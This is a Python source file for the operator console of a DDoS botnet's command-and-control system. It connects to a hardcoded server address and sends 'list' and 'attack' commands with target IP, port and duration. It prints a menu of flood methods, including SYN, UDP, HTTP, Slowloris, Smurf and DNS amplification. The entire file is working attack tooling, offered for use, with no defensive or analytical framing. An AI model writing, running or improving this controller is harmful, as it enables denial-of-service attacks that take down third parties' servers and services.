import os
import socket
import threading
from pystyle import Colors, Colorate, Center

def banner():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    
    banner_text = '''
    ███████████████████████████████████████████
    ███ KILL CHAIN COMMAND & CONTROL INTERFACE ███
    ███████████████████████████████████████████
    '''
    print(Colorate.Vertical(Colors.red_to_black, Center.XCenter(banner_text), 1))

def handle_response(client):
    while True:
        try:
            response = client.recv(1024).decode('utf-8')
            if response:
                print(response)
        except socket.error as e:
            print(f"Error receiving data: {e}")
            continue

def send_command(client, command):
    try:
        client.send(command.encode('utf-8'))
    except socket.error as e:
        print(f"Error sending data: {e}")

def connect_as_commander(host, port, username):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(username.encode('utf-8'))  # Send username as "commander"
    banner()
    
    # Start a separate thread to handle incoming responses
    threading.Thread(target=handle_response, args=(client,), daemon=True).start()
    
    while True:
        command = input(Colorate.Horizontal(Colors.blue_to_white, "admin@KCNET;~ $ "))
        
        if command.lower() == "exit":
            print(Colorate.Horizontal(Colors.red_to_black, "Exiting..."))
            break
        
        # Conditional command handling
        if command.lower() == "help":
            print(Colorate.Horizontal(Colors.green_to_white, """Available Commands:
- help: Show this help message.
- list: List active bots.
- attack <type> <ip> <port> <duration>: Execute an attack.
- methods: Show available attack methods.
- usage: Show usage details for the attack command.
- exit: Exit the command interface."""))
        elif command.lower() == "list":
            send_command(client, command)
        elif command.lower().startswith("attack"):
            send_command(client, command)
        elif command.lower() == "methods":
            print(Colorate.Horizontal(Colors.cyan_to_blue, """
Methods Available:
UDP                   - Sends a flood of UDP packets to the target.
TCP                   - Opens multiple TCP connections to exhaust resources.
SYN                   - Floods the target with TCP SYN requests.
ICMP                  - Sends ICMP Echo Request packets (Ping flood).
HTTP                  - Generates high-frequency HTTP GET requests.
HTTP POST             - Sends repeated HTTP POST requests with data payloads.
Smurf                 - Amplifies ICMP requests using broadcast addresses.
Slowloris             - Holds open connections to exhaust the target server.
DNS Amplification     - Exploits DNS servers to amplify traffic toward the target.
            """))
        elif command.lower() == "usage":
            print(Colorate.Horizontal(Colors.purple_to_blue, """Usage of the attack command:
attack <type> <ip> <port> <duration>
Where:
- <type> is the attack method, e.g., UDP, TCP, HTTP POST.
- <ip> is the target IP address.
- <port> is the target port number.
- <duration> is the duration of the attack in seconds.
Example:
attack udp 192.168.1.1 80 30"""))
        else:
            # Invalid command
            print(Colorate.Horizontal(Colors.red_to_black, "Invalid command. Please try again."))
            continue
        
        # After sending the command, continue accepting new input
        # Response handling will happen in the background

    client.close()

if __name__ == "__main__":
    connect_as_commander("15.204.236.177", 65432, "commander")
